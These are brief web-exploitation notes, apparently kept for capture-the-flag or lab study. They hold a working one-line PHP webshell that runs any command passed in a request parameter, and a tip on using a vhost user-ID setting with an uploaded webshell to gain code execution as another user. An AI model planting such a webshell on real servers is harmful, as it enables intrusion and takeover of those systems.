Web exploitation

# Web exploitation

## PHP webshell
```php
<?php echo system($_REQUEST ['cmd']); ?>
```

## Downloading image files

`wget`, unlike Firefox doesn't strip out metadata from image files. So this preserves some additional `exiftool` data like file modified dates.

## Virtual host config

1. When you have `Assign User-ID` in vhost config and a shell, can upload a Webshell to achieve RCE under a different user, see OpenAdmin for eg.
